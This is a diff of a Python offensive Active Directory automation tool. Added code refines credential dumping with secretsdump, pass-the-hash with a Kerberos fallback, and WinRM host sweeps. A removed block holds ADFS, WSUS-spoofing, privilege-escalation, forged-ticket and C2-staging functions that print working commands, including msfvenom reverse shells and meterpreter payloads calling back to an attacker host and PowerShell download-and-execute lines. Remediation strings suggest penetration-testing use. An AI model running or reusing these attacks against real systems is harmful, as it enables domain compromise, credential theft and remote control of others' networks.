         results.append(f"=== Timeroast ===\n{out[:1500]}")
         hashes = [l for l in out.splitlines() if l.startswith("$sntp-ms$")]
         if hashes:
@@ -7830,10 +8320,12 @@ def tool_timeroast(dc_ip: str, domain: str, username: str = "",
                         "Reset computer account passwords regularly; monitor for anomalous NTP requests")
     else:
         results.append(
-            "timeroast.py not found. Install:\n"
+            "timeroast.py not found and auto-install failed.\n"
+            "Manual install:\n"
             "  pip install timeroast\n"
-            "  # or: https://github.com/SecuraBV/Timeroast\n\n"
-            f"Manual: python3 timeroast.py {dc_ip}"
+            "  # or: git clone https://github.com/SecuraBV/Timeroast && "
+            "cp Timeroast/timeroast.py ~/.local/bin/\n\n"
+            f"Then run: python3 timeroast.py {dc_ip}"
         )
     return "\n\n".join(results)
 
@@ -7859,19 +8351,31 @@ def tool_credential_dump(dc_ip: str, domain: str, username: str,
     host = str(target_ip or dc_ip).strip()
     password = _real_secret(password)
     nt_hash   = _real_nt_hash(nt_hash)
+    # Auto-populate NT hash from loot if not provided (covers gMSA accounts)
+    if not nt_hash and not password:
+        loot = SESSION.get("loot", {})
+        nt_hash = (loot.get(username)
+                   or loot.get(username.rstrip("$"))
+                   or loot.get(username + "$")
+                   or "")
     auth      = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
     krb       = _session_kerberos_usable(username, domain)
     ccache    = SESSION.get("krb5_ccache", "")
     results   = [f"=== Credential Dump: {username}@{host} ==="]
 
     secretsdump = _impacket_cmd("secretsdump")
+    # shell_quote the connection target — $ in gMSA names (msa_health$) expands
+    # as $@ or $<char> in bash and corrupts the host portion of the argument.
     if nt_hash:
-        sd_auth = f"{domain}/{username}@{host} -hashes :{nt_hash.split(':')[-1]}"
+        _sd_target = shell_quote(f"{domain}/{username}@{host}")
+        sd_auth = f"{_sd_target} -hashes :{nt_hash.split(':')[-1]}"
     elif krb and ccache:
         os.environ["KRB5CCNAME"] = ccache
-        sd_auth = f"-k -no-pass {domain}/{username}@{host}"
+        _sd_target = shell_quote(f"{domain}/{username}@{host}")
+        sd_auth = f"-k -no-pass {_sd_target}"
     elif password:
-        sd_auth = f"{domain}/{username}:{password}@{host}"
+        _sd_target = shell_quote(f"{domain}/{username}:{password}@{host}")
+        sd_auth = f"{_sd_target}"
     else:
         sd_auth = ""
 
@@ -7894,16 +8398,43 @@ def tool_credential_dump(dc_ip: str, domain: str, username: str,
         results.append(f"=== secretsdump ===\n{sd_out[:2000]}")
         _extract_creds_into_session(sd_out)
 
+        # Additive Kerberos fallback: on NTLM-disabled DCs (common in hardened AD)
+        # the -hashes pass-the-hash attempt above fails with STATUS_NOT_SUPPORTED.
+        # If it produced no real pwdump hash line and a usable Kerberos ccache
+        # exists, retry secretsdump over Kerberos before giving up. Purely
+        # additive — only runs when the first attempt did NOT already dump hashes
+        # and the primary path wasn't already Kerberos. Target-agnostic.
+        if (not re.search(r"[a-f0-9]{32}:[a-f0-9]{32}:::", sd_out, re.I)
+                and krb and ccache and "-k " not in sd_auth):
+            os.environ["KRB5CCNAME"] = ccache
+            _kt = shell_quote(f"{domain}/{username}@{host}")
+            ksd_out = _run(f"{secretsdump} -k -no-pass {_kt} -just-dc-ntlm 2>&1 || "
+                           f"{secretsdump} -k -no-pass {_kt} 2>&1", timeout=90)
+            results.append(f"=== secretsdump (Kerberos) ===\n{ksd_out[:2000]}")
+            _extract_creds_into_session(ksd_out)
+
     # nanodump via nxc module
     if method == "nanodump":
         nano_out = _nxc(f"smb {host} {auth} -M nanodump", timeout=60)
         results.append(f"=== nanodump ===\n{nano_out[:1200]}")
 
     all_out = "\n".join(results)
-    if any(s in all_out.lower() for s in ("ntlm:", "aad3b435", ":31d6", "administrator:")):
+    # Only flag success on an ACTUAL dumped pwdump hash line (user:rid:lm:nt:::).
+    # The old check matched substrings like "ntlm:" — which appears in every nxc
+    # banner as "(NTLM:False)" — so it fired even when every dump returned
+    # STATUS_NOT_SUPPORTED (false-positive Critical). The pwdump line only appears
+    # when SAM/LSA/secretsdump/NTDS genuinely returned hashes.
+    if re.search(r"[a-f0-9]{32}:[a-f0-9]{32}:::", all_out, re.I):
         add_finding("Credential Dump Successful", "Critical",
                     f"Credentials extracted from {host}",
-                    "Enable Credential Guard; use Protected Users; audit LSASS access")
+                    "Enable Credential Guard; use Protected Users; audit LSASS access",
+                    proof_level="exploited")
+        all_out += "\nNEXT: dcsync_attack to dump all domain hashes (krbtgt + Administrator)"
+    elif nt_hash:
+        all_out += (
+            f"\nHint: credential_dump failed via SMB — try dcsync_attack directly:\n"
+            f"  impacket-secretsdump {domain}/{username}@{host} -hashes :{nt_hash} -just-dc-ntlm"
+        )
     return all_out[:6000]
 
 
@@ -8213,6 +8744,24 @@ def tool_user_hunt(dc_ip: str, domain: str, username: str,
         subnet_cidr = subnet if "/" in subnet else f"{subnet}/24"
         sweep_out = _nxc(f"smb {subnet_cidr} {auth} --no-bruteforce 2>&1 | grep '\\[+\\]'", timeout=60)
         results.append(f"=== NXC Sweep ===\n{sweep_out[:800]}")
+        # Try WinRM on non-DC hosts that responded with valid auth ([+])
+        for m in re.finditer(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+\S+\s+\[\+\]', sweep_out):
+            host_ip = m.group(1)
+            if host_ip == dc_ip:
+                continue
+            winrm_test = _nxc(f"winrm {host_ip} {auth}", timeout=15)
+            if "Pwn3d" in winrm_test:
+                wt = SESSION.setdefault("agent_intel", {}).setdefault("winrm_targets", [])
+                if host_ip not in wt:
+                    wt.append(host_ip)
+                add_finding(
+                    "WinRM Access Found", "High",
+                    f"WinRM shell access: {domain}\\{username} on {host_ip}",
+                    "Restrict WinRM access; implement Just Enough Administration (JEA)"
+                )
+                results.append(f"WinRM Pwn3d! on {host_ip}")
+            elif "[+]" in winrm_test or "[-]" not in winrm_test:
+                results.append(f"SMB valid on {host_ip} — WinRM not available")
     else:
         results.append(f"Found {len(computers)} domain computers")
 
@@ -8472,7 +9021,7 @@ def tool_adidns_abuse(dc_ip: str, domain: str, username: str,
 
     dnstool_paths = [
         os.path.expanduser("~/.local/bin/dnstool.py"),
-        str(Path(__file__).parent.parent / "tools" / "krbrelayx" / "dnstool.py"),
+        str(Path(__file__).parent.parent.parent / "tools" / "krbrelayx" / "dnstool.py"),
         "/opt/krbrelayx/dnstool.py",
     ]
     dnstool = next((p for p in dnstool_paths if Path(p).exists()), "")
@@ -8637,591 +9186,6 @@ def tool_rodc_attack(dc_ip: str, domain: str, username: str,
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  NEW TOOL IMPLEMENTATIONS — AdAgent Extensions
-# ══════════════════════════════════════════════════════════════════════════════
-
-def tool_adfs_attack(dc_ip: str, domain: str, username: str,
-                     password: str = "", nt_hash: str = "",
-                     adfs_server: str = "", action: str = "enumerate") -> str:
-    """ADFS/Golden SAML attack chain: DKM enumeration, token cert extraction, PTA/PHS check."""
-    password   = _real_secret(password)
-    nt_hash    = _real_nt_hash(nt_hash)
-    results    = []
-    intel      = SESSION.setdefault("agent_intel", {})
-
-    # Auto-discover ADFS server
-    if not adfs_server:
-        adfs_candidates = intel.get("adfs_servers", [])
-        if adfs_candidates:
-            adfs_server = adfs_candidates[0]
-        else:
-            adfs_server = f"adfs.{domain}"
-
-    auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
-
-    # ── 1. ADFS service discovery ─────────────────────────────────────────────
-    base_dn = SESSION.get("base_dn") or ("DC=" + domain.replace(".", ",DC="))
-    ldap_auth = f"-D '{username}@{domain}' -w '{password}'" if password else f"-D '{username}@{domain}' -H '{nt_hash}'"
-
-    adfs_ldap = _run(
-        f"ldapsearch -x -H ldap://{dc_ip} {ldap_auth} -b '{base_dn}' "
-        f"'(|(objectClass=msDS-Device)(serviceConnectionPoint=*))(cn=*adfs*)' "
-        f"cn dNSHostName serviceClassName 2>/dev/null | head -30",
-        timeout=15
-    )
-    results.append(f"=== ADFS Service Discovery (LDAP) ===\n{adfs_ldap[:600] or '(no ADFS SCP found)'}")
-
-    # ── 2. DKM container — stores token signing cert ──────────────────────────
-    dkm_dn = f"CN=ADFS,CN=Microsoft,CN=Program Data,{base_dn}"
-    dkm_out = _run(
-        f"ldapsearch -x -H ldap://{dc_ip} {ldap_auth} -b '{dkm_dn}' "
-        f"'(objectClass=contact)' thumbnailPhoto 2>/dev/null | head -20",
-        timeout=12
-    )
-    results.append(f"=== DKM Container (ADFS Token Cert) ===\n{dkm_out[:600] or '(DKM not accessible or empty)'}")
-
-    if "thumbnailPhoto" in dkm_out:
-        add_finding("ADFS DKM Accessible", "Critical",
-                    f"ADFS Distributed Key Manager container readable — token signing cert may be extractable",
-                    "Restrict DKM container ACL to ADFS service account and Domain Admins only")
-        results.append(
-            f"[CRITICAL] DKM readable — extract token signing cert:\n"
-            f"  AADInternals: Export-AADIntADFSSigningCertificate\n"
-            f"  Manual: ldapsearch -b '{dkm_dn}' thumbnailPhoto | base64 -d > adfs_cert.pfx\n"
-            f"  Then: Open-AADIntOffice365 -SAML $forged_saml"
-        )
-
-    # ── 3. ADFS metadata endpoint ─────────────────────────────────────────────
-    meta_url = f"https://{adfs_server}/FederationMetadata/2007-06/FederationMetadata.xml"
-    meta_out = _run(
-        f"curl -k -sS --max-time 8 {shell_quote(meta_url)} 2>&1 | head -20",
-        timeout=12
-    )
-    results.append(f"=== ADFS Metadata ({adfs_server}) ===\n{meta_out[:500] or '(unreachable)'}")
-    if "EntityDescriptor" in meta_out or "X509Certificate" in meta_out:
-        add_finding("ADFS Metadata Exposed", "Medium",
-                    f"ADFS metadata endpoint accessible — SAML entity IDs and signing cert thumbprint exposed",
-                    "Restrict FederationMetadata.xml to authenticated requests; enable WAP pre-auth")
-
-    # ── 4. Azure AD Connect MSOL account check ────────────────────────────────
-    msol_users = _run(
-        f"ldapsearch -x -H ldap://{dc_ip} {ldap_auth} -b '{base_dn}' "
-        f"'(|(sAMAccountName=MSOL_*)(sAMAccountName=AADConnect*)(description=*Azure AD Connect*))' "
-        f"sAMAccountName description 2>/dev/null | grep -E 'sAMAccountName:|description:'",
-        timeout=12
-    )
-    results.append(f"=== Azure AD Connect (MSOL) Accounts ===\n{msol_users[:500] or '(no MSOL accounts found)'}")
-    if "MSOL_" in msol_users or "AADConnect" in msol_users:
-        add_finding("Azure AD Connect MSOL Account Found", "Critical",
-                    "MSOL account has DCSync privileges — compromise enables full hash dump",
-                    "Harden AAD Connect server; rotate MSOL password; audit DCSync rights")
-        results.append(
-            "[CRITICAL] MSOL account has DCSync rights:\n"
-            f"  1. Extract MSOL password: python3 adconnect.py {adfs_server}\n"
-            f"     or: Get-AADIntSyncCredentials (from AADConnect server)\n"
-            f"  2. DCSync: impacket-secretsdump {domain}/MSOL_xxx:<pass>@{dc_ip} -just-dc-ntlm"
-        )
-
-    # ── 5. PTA spy check (if AADInternals available) ──────────────────────────
-    if action == "pta_check":
-        pta_out = _run("powershell -c 'Get-AADIntPTASpy' 2>&1 | head -10", timeout=10)
-        results.append(f"=== PTA Spy ===\n{pta_out[:300]}")
-
-    combined = "\n\n".join(results)
-    intel.setdefault("adfs_servers", [])
-    if adfs_server and adfs_server not in intel["adfs_servers"]:
-        intel["adfs_servers"].append(adfs_server)
-    return combined[:5000]
-
-
-def tool_wsus_attack(dc_ip: str, domain: str, username: str,
-                     password: str = "", nt_hash: str = "",
-                     wsus_server: str = "") -> str:
-    """WSUS attack: discover via GPO/registry, check HTTP, pywsus injection guide."""
-    password = _real_secret(password)
-    nt_hash  = _real_nt_hash(nt_hash)
-    results  = []
-    auth     = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
-    intel    = SESSION.setdefault("agent_intel", {})
-
-    # ── 1. Discover WSUS server via NXC module ────────────────────────────────
-    wsus_disc = _nxc(f"smb {dc_ip} {auth} -M wsus", timeout=25)
-    results.append(f"=== WSUS Discovery (NXC module) ===\n{wsus_disc[:800] or '(no output)'}")
-
-    # Parse WSUS server from output
-    m = re.search(r'https?://([A-Za-z0-9_.-]+)(?::853[01])?', wsus_disc, re.I)
-    if m and not wsus_server:
-        wsus_server = m.group(1)
-        info(f"WSUS server discovered: {wsus_server}")
-
-    # ── 2. Registry-based discovery (via WinRM if available) ─────────────────
-    reg_cmd = ("powershell -c \""
-               "$wu = Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate' "
-               "-ErrorAction SilentlyContinue; "
-               "Write-Output 'WSUS Server:' $wu.WUServer; "
-               "Write-Output 'WSUS Status:' $wu.WUStatusServer\"")
-    winrm_targets = intel.get("winrm_targets", [dc_ip])
-    for tgt in winrm_targets[:2]:
-        reg_out = _nxc(f"winrm {tgt} {auth} -x {shell_quote(reg_cmd)}", timeout=20)
-        results.append(f"=== WSUS Registry ({tgt}) ===\n{reg_out[:400]}")
-        m2 = re.search(r'https?://([A-Za-z0-9_.-]+)(?::853[01])?', reg_out, re.I)
-        if m2 and not wsus_server:
-            wsus_server = m2.group(1)
-
-    # ── 3. HTTP check ─────────────────────────────────────────────────────────
-    if wsus_server:
-        wsus_url = f"http://{wsus_server}:8530/SimpleAuthWebService/SimpleAuth.asmx"
-        http_out = _run(f"curl -k -I -sS --max-time 8 {shell_quote(wsus_url)} 2>&1 | head -15", timeout=12)
-        results.append(f"=== WSUS HTTP Endpoint ({wsus_server}:8530) ===\n{http_out[:400]}")
-        if any(x in http_out for x in ("200 OK", "401", "403", "WSUSServer")):
-            add_finding("WSUS HTTP Endpoint Accessible", "Critical",
-                        f"WSUS server {wsus_server} uses HTTP (port 8530) — vulnerable to fake-update MITM",
-                        "Configure WSUS to use HTTPS; enforce SSL in all WSUS GPO policies")
-            results.append(
-                f"[CRITICAL] WSUS on HTTP — pywsus injection guide:\n"
-                f"  1. ARP spoof client → WSUS: sudo arpspoof -i tun0 -t <client_ip> {wsus_server}\n"
-                f"  2. Start pywsus:\n"
-                f"     sudo python3 pywsus.py -H {SESSION.get('attacker_ip','<attacker>')} -p 8530 \\\n"
-                f"       -e /tmp/PsExec64.exe -c '/accepteula /s cmd.exe /c whoami > C:\\\\wsus.txt'\n"
-                f"  3. Force client update check: wuauclt /detectnow /updatenow\n"
-                f"  Install pywsus: pip install pywsus\n"
-                f"  Alternative (SharpWSUS):\n"
-                f"  SharpWSUS.exe create /payload:PsExec64.exe /args:'/accepteula /s cmd.exe /c whoami'\n"
-                f"  SharpWSUS.exe approve /updateid:<guid> /computername:<target>"
-            )
-        https_url = f"https://{wsus_server}:8531"
-        https_out = _run(f"curl -k -I -sS --max-time 8 {shell_quote(https_url)} 2>&1 | head -5", timeout=10)
-        results.append(f"=== WSUS HTTPS Check ===\n{https_out[:200] or '(no response on 8531)'}")
-    else:
-        results.append("WSUS server not discovered. Enumerate GPO manually:\n"
-                       f"  nxc smb {dc_ip} {auth} -M wsus\n"
-                       f"  ldapsearch ... '(objectClass=groupPolicyContainer)' gPCFileSysPath | grep -i wsus")
-
-    if wsus_server:
-        intel.setdefault("wsus_servers_confirmed", [])
-        if wsus_server not in intel["wsus_servers_confirmed"]:
-            intel["wsus_servers_confirmed"].append(wsus_server)
-
-    return "\n\n".join(results)[:4000]
-
-
-def tool_local_privesc_chain(target_ip: str, domain: str, username: str,
-                             password: str = "", nt_hash: str = "") -> str:
-    """Full local privilege escalation chain on a compromised host."""
-    password = _real_secret(password)
-    nt_hash  = _real_nt_hash(nt_hash)
-    results  = []
-    auth     = _auth_args_nxc(username, password, nt_hash, domain, target_ip)
-    intel    = SESSION.setdefault("agent_intel", {})
-
-    # ── 1. Whoami /all — token privileges ────────────────────────────────────
-    whoami_out = _nxc(f"winrm {target_ip} {auth} -x 'whoami /all'", timeout=20)
-    results.append(f"=== Token Privileges ===\n{whoami_out[:800]}")
-
-    # Check for potato-abusable privileges
-    potato_privs = []
-    for priv in ("SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
-                 "SeTcbPrivilege", "SeCreateTokenPrivilege"):
-        if priv.lower() in whoami_out.lower():
-            potato_privs.append(priv)
-    if potato_privs:
-        add_finding("Potato-Abusable Token Privileges", "Critical",
-                    f"Token has: {', '.join(potato_privs)} — Potato/PrintSpoofer can yield SYSTEM",
-                    "Remove IIS/service account from Administrators; use service accounts without these privileges")
-        results.append(
-            f"[CRITICAL] Potato attack possible ({', '.join(potato_privs)}):\n"
-            f"  GodPotato:    GodPotato.exe -cmd 'cmd /c whoami'\n"
-            f"  PrintSpoofer: PrintSpoofer64.exe -i -c powershell.exe\n"
-            f"  SweetPotato:  SweetPotato.exe -e EfsRpc -p C:\\\\payload.exe"
-        )
-        intel.setdefault("local_privesc_paths", []).append("potato_" + potato_privs[0])
-
-    # ── 2. AlwaysInstallElevated ──────────────────────────────────────────────
-    aie_cmd = ("powershell -c \""
-               "$hklm = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' "
-               "-Name AlwaysInstallElevated -EA SilentlyContinue).AlwaysInstallElevated; "
-               "$hkcu = (Get-ItemProperty 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' "
-               "-Name AlwaysInstallElevated -EA SilentlyContinue).AlwaysInstallElevated; "
-               "Write-Output \"HKLM=$hklm HKCU=$hkcu\"\"")
-    aie_out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(aie_cmd)}", timeout=15)
-    results.append(f"=== AlwaysInstallElevated ===\n{aie_out[:300]}")
-    if "HKLM=1" in aie_out and "HKCU=1" in aie_out:
-        add_finding("AlwaysInstallElevated Enabled", "High",
-                    "AlwaysInstallElevated allows any user to install MSI packages as SYSTEM",
-                    "Set AlwaysInstallElevated to 0 in both HKLM and HKCU via GPO")
-        results.append(
-            "[HIGH] AlwaysInstallElevated:\n"
-            "  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f msi > evil.msi\n"
-            "  msiexec /quiet /qn /i evil.msi"
-        )
-        intel.setdefault("local_privesc_paths", []).append("always_install_elevated")
-
-    # ── 3. Unquoted service paths ─────────────────────────────────────────────
-    usp_cmd = ("wmic service get name,pathname,startmode | "
-               "findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v '\"'")
-    usp_out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(usp_cmd)}", timeout=20)
-    results.append(f"=== Unquoted Service Paths ===\n{usp_out[:600] or '(none found)'}")
-    if re.search(r'[A-Z]:\\.*\s.*\.exe', usp_out):
-        add_finding("Unquoted Service Paths", "Medium",
-                    "Services with unquoted paths containing spaces may be exploitable for privilege escalation",
-                    "Quote all service executable paths in registry")
-        intel.setdefault("local_privesc_paths", []).append("unquoted_service")
-
-    # ── 4. Writable service binaries ─────────────────────────────────────────
-    wsvc_cmd = ("powershell -c \""
-                "$svcs = Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -ne 'Disabled'}; "
-                "foreach ($s in $svcs) { "
-                "  $p = $s.PathName -replace '\"',''; $p = ($p -split ' ')[0]; "
-                "  try { $acl = Get-Acl $p -EA Stop; "
-                "    $w = $acl.Access | Where-Object {$_.IdentityReference -match 'Users|Everyone|Authenticated' "
-                "      -and $_.FileSystemRights -match 'Write|FullControl'}; "
-                "    if ($w) { Write-Output \"WRITABLE: $p ($($s.Name))\" } "
-                "  } catch {} }\"")
-    wsvc_out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(wsvc_cmd)}", timeout=30)
-    results.append(f"=== Writable Service Binaries ===\n{wsvc_out[:500] or '(none found)'}")
-    if "WRITABLE:" in wsvc_out:
-        add_finding("Writable Service Binary", "High",
-                    f"Service executable writable by current user — replace for SYSTEM code execution",
-                    "Fix service binary ACLs; use icacls to restrict write access")
-        intel.setdefault("local_privesc_paths", []).append("writable_service")
-
-    # ── 5. WSUS local client check ───────────────────────────────────────────
-    wsus_reg = ("powershell -c \""
-                "$wu = Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate' -EA SilentlyContinue; "
-                "if ($wu.WUServer -match 'http://') { Write-Output 'WSUS HTTP: VULNERABLE ' + $wu.WUServer }\"")
-    wsus_out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(wsus_reg)}", timeout=15)
-    results.append(f"=== WSUS Client Config ===\n{wsus_out[:300]}")
-    if "VULNERABLE" in wsus_out:
-        intel.setdefault("local_privesc_paths", []).append("wsus_http_client")
-
-    # ── 6. PowerUp summary ───────────────────────────────────────────────────
-    results.append(
-        "=== PowerUp Quick Run ===\n"
-        "Download and run PowerUp for comprehensive checks:\n"
-        f"  nxc winrm {target_ip} {auth} -x "
-        "\"powershell -ep bypass -c 'iex (New-Object Net.WebClient).DownloadString(\\\"https://raw.githubusercontent.com/"
-        "PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\\\"); Invoke-AllChecks'\""
-    )
-
-    if intel.get("local_privesc_paths"):
-        add_finding("Local Privilege Escalation Paths Found", "High",
-                    f"Escalation vectors: {', '.join(intel['local_privesc_paths'][:5])}",
-                    "Apply least privilege; patch service configurations; enforce LAPS")
-
-    return "\n\n".join(results)[:5000]
-
-
-def tool_trust_chain_planner(dc_ip: str, domain: str, username: str,
-                             password: str = "", nt_hash: str = "") -> str:
-    """Multi-domain/forest trust enumeration and ExtraSID attack chain planning."""
-    password = _real_secret(password)
-    nt_hash  = _real_nt_hash(nt_hash)
-    results  = []
-    auth     = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
-    base_dn  = SESSION.get("base_dn") or ("DC=" + domain.replace(".", ",DC="))
-    intel    = SESSION.setdefault("agent_intel", {})
-
-    # ── 1. Enumerate trusts via LDAP ─────────────────────────────────────────
-    ldap_auth = f"-D '{username}@{domain}' -w '{password}'" if password else ""
-    trust_ldap = _run(
-        f"ldapsearch -x -H ldap://{dc_ip} {ldap_auth} -b '{base_dn}' "
-        f"'(objectClass=trustedDomain)' trustDirection trustPartner trustType flatName 2>/dev/null",
-        timeout=15
-    )
-    results.append(f"=== Domain Trusts (LDAP) ===\n{trust_ldap[:800] or '(none found)'}")
-
-    # ── 2. nltest trust enum ──────────────────────────────────────────────────
-    nltest_out = _nxc(f"winrm {dc_ip} {auth} -x 'nltest /domain_trusts /all_trusts'", timeout=15)
-    results.append(f"=== nltest /domain_trusts ===\n{nltest_out[:500]}")
-
-    # ── 3. impacket findDelegation for cross-domain paths ────────────────────
-    pw_or_hash = f"'{password}'" if password else ""
-    hash_flag  = f"-hashes :{nt_hash.split(':')[-1]}" if nt_hash else ""
-    delg_out = _run(
-        f"impacket-findDelegation {domain}/{username}:{pw_or_hash} {hash_flag} -dc-ip {dc_ip} 2>&1 | head -30",
-        timeout=20
-    )
-    results.append(f"=== Cross-Domain Delegation ===\n{delg_out[:600]}")
-
-    # ── 4. Parse trust domains and plan attacks ───────────────────────────────
-    trust_domains = re.findall(r'trustPartner\s*:\s*([A-Za-z0-9._-]+)', trust_ldap, re.I)
-    trust_domains += re.findall(r'Trust:\s*([A-Za-z0-9._-]+)', nltest_out, re.I)
-    trust_domains = list(set(trust_domains))
-
-    intel["trust_domains"] = trust_domains
-
-    if trust_domains:
-        add_finding("Domain Trusts Discovered", "High",
-                    f"Trust relationships found: {', '.join(trust_domains)} — potential lateral movement paths",
-                    "Enable SID Filtering on all trusts; audit trust relationships regularly")
-
-    # ── 5. Cross-forest Kerberoast ────────────────────────────────────────────
-    for td in trust_domains[:3]:
-        spn_out = _run(
-            f"impacket-GetUserSPNs {domain}/{username}:{pw_or_hash} {hash_flag} "
-            f"-target-domain {td} -dc-ip {dc_ip} -request 2>&1 | head -20",
-            timeout=25
-        )
-        results.append(f"=== Cross-Forest Kerberoast ({td}) ===\n{spn_out[:400]}")
-        if "$krb5tgs$" in spn_out:
-            add_finding("Cross-Forest Kerberoastable SPNs", "High",
-                        f"SPNs in trust domain {td} are roastable from {domain}",
-                        "Use gMSA for cross-forest service accounts; restrict SPN exposure")
-
-    # ── 6. ExtraSID attack guidance ───────────────────────────────────────────
-    domain_sid = SESSION.get("domain_sid", "")
-    if not domain_sid:
-        sid_out = _nxc(f"smb {dc_ip} {auth} --get-sid", timeout=15)
-        m = re.search(r'S-1-5-21-[0-9-]+', sid_out)
-        if m:
-            domain_sid = m.group(0)
-            SESSION["domain_sid"] = domain_sid
-
-    krbtgt_hash = SESSION.get("loot", {}).get("krbtgt", "")
-    if trust_domains:
-        results.append(
-            f"=== ExtraSID Attack Plan ===\n"
-            f"If you have child domain krbtgt hash and domain SID:\n"
-            f"  1. Get parent domain SID:\n"
-            f"     impacket-lookupsid {domain}/{username}:{pw_or_hash or '<hash>'} @{trust_domains[0]} 2>&1 | grep 'S-1-5-21'\n"
-            f"  2. Forge inter-realm TGT:\n"
-            f"     impacket-ticketer -nthash <child_krbtgt_hash> \\\n"
-            f"       -domain-sid {domain_sid or '<child_domain_sid>'} \\\n"
-            f"       -domain {domain} \\\n"
-            f"       -extra-sid <parent_SID>-519 Administrator\n"
-            f"  3. Use it:\n"
-            f"     export KRB5CCNAME=Administrator.ccache\n"
-            f"     impacket-psexec {trust_domains[0]}/Administrator@{trust_domains[0]} -k -no-pass"
-        )
-
-    return "\n\n".join(results)[:5000]
-
-
-def tool_c2_stage(target_ip: str, domain: str, username: str,
-                  password: str = "", nt_hash: str = "",
-                  c2_type: str = "auto", attacker_ip: str = "") -> str:
-    """C2 payload staging: generate, host, deliver, and verify beacon."""
-    password    = _real_secret(password)
-    nt_hash     = _real_nt_hash(nt_hash)
-    attacker_ip = attacker_ip or SESSION.get("attacker_ip", "")
-    auth        = _auth_args_nxc(username, password, nt_hash, domain, target_ip)
-    results     = []
-    intel       = SESSION.setdefault("agent_intel", {})
-
-    # ── Auto-select C2 based on available tools ───────────────────────────────
-    if c2_type == "auto":
-        if shutil.which("sliver-server"):
-            c2_type = "sliver"
-        elif shutil.which("havoc"):
-            c2_type = "havoc"
-        elif shutil.which("msfconsole"):
-            c2_type = "msf"
-        else:
-            c2_type = "msf"
-
-    # ── Check available delivery methods ─────────────────────────────────────
-    winrm_avail = target_ip in intel.get("winrm_targets", [])
-    auth_for_display = f"{username}:{'<pass>' if password else '<hash>'}"
-
-    if c2_type == "sliver":
-        results.append(
-            "=== Sliver C2 Stage ===\n"
-            f"Listener IP: {attacker_ip or '<attacker_ip>'}\n\n"
-            "1. Start Sliver server (if not running):\n"
-            "   sliver-server\n\n"
-            "2. Generate implant:\n"
-            "   sliver> generate --http {attacker}:8443 --os windows --arch amd64 "
-            "--save /tmp/implant.exe --name beacon\n\n"
-            "3. Start HTTP listener:\n"
-            "   sliver> http --lhost 0.0.0.0 --lport 8443\n\n"
-            f"4. Deliver via WinRM (if available on {target_ip}):\n"
-            f"   evil-winrm -i {target_ip} -u {username} {'-H ' + nt_hash if nt_hash else '-p <pass>'}\n"
-            f"   [*] Invoke-WebRequest http://{attacker_ip or '<attacker>'}:8080/implant.exe -Out C:\\\\Temp\\\\svc.exe; C:\\\\Temp\\\\svc.exe\n\n"
-            f"4b. Deliver via SMB:\n"
-            f"   smbclient //{target_ip}/C$ -U {domain}\\\\{username} "
-            f"{'--pw-nt-hash ' + nt_hash if nt_hash else ''} -c 'put /tmp/implant.exe Windows\\\\Temp\\\\svc.exe'\n"
-            f"   nxc smb {target_ip} {auth} -x 'C:\\\\Windows\\\\Temp\\\\svc.exe'"
-        )
-    elif c2_type == "havoc":
-        results.append(
-            "=== Havoc C2 Stage ===\n"
-            "1. Start Havoc teamserver: ./havoc server --profile ./profiles/havoc.yaotl\n"
-            "2. In Havoc client: Attacks → Generate → Demon → HTTPS listener\n"
-            f"3. Deliver: evil-winrm -i {target_ip} ... then IEX(...DownloadString(...))\n"
-        )
-    else:  # msf
-        lhost = attacker_ip or "<attacker>"
-        results.append(
-            "=== Metasploit Stage ===\n"
-            f"1. Generate payload:\n"
-            f"   msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT=4443 "
-            f"-f exe -e x64/xor_dynamic -o /tmp/payload.exe\n\n"
-            f"2. Start handler:\n"
-            f"   msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_https; "
-            f"set LHOST {lhost}; set LPORT 4443; set ExitOnSession false; run -j'\n\n"
-            f"3. Deliver:\n"
-            f"   python3 -m http.server 8080 &   # serve /tmp/payload.exe\n"
-            f"   nxc winrm {target_ip} {auth} -x "
-            f"\"powershell IEX (New-Object Net.WebClient).DownloadFile('http://{lhost}:8080/payload.exe','C:\\\\Temp\\\\p.exe'); C:\\\\Temp\\\\p.exe\""
-        )
-
-    # ── Verify delivery path ──────────────────────────────────────────────────
-    verify_out = _nxc(f"winrm {target_ip} {auth} -x 'whoami'", timeout=15)
-    results.append(f"=== Delivery Path Check (WinRM) ===\n{verify_out[:300]}")
-    if "pwn3d" in verify_out.lower() or domain.lower() in verify_out.lower():
-        results.append(f"[+] WinRM delivery path confirmed for {target_ip}")
-        intel.setdefault("c2_sessions", []).append(f"{c2_type}:{target_ip}")
-    else:
-        results.append(
-            f"WinRM not available to {target_ip}. Try SMB delivery:\n"
-            f"  nxc smb {target_ip} {auth} -x 'dir C:\\\\Temp'"
-        )
-
-    return "\n\n".join(results)[:4000]
-
-
-def tool_rediscover_target(dc_ip: str) -> str:
-    """Re-run target discovery: LDAP rootDSE, nxc SMB, quick port check."""
-    import subprocess
-    results = []
-
-    # LDAP rootDSE
-    try:
-        from ldap3 import Server, Connection, ALL
-        srv = Server(dc_ip, get_info=ALL, connect_timeout=3)
-        con = Connection(srv, receive_timeout=4)
-        if con.bind():
-            info_ = srv.info
-            if info_:
-                ctx = info_.other.get("defaultNamingContext")
-                if ctx:
-                    base_dn = str(ctx[0])
-                    dom = base_dn.replace("DC=", "").replace(",", ".").lower()
